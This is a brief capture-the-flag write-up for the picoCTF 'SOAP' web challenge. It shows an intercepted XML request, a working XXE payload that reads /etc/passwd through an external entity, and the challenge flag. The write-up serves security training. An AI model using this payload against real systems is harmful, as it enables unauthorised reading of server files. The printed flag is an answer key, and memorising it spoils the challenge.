# SOAP
Write-Up by **Mttttt** *2024-06-25*

## Task description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:55688/)

- *Category*: **Web Exploiation**
- *Difficulty*: **Medium**

## Solution 
Lets capture our request
```
POST /data HTTP/1.1
Host: saturn.picoctf.net:55688
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://saturn.picoctf.net:55688/
Content-Type: application/xml
Content-Length: 61
Origin: http://saturn.picoctf.net:55688
Connection: close
Priority: u=1

<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
```

It seems to be XXE vulnerability

Use payload `<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd">`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> <!-- This is an external entity -->
]>
<data>
  <ID>&xxe;</ID>
</data>
```

## Answer
`picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}`
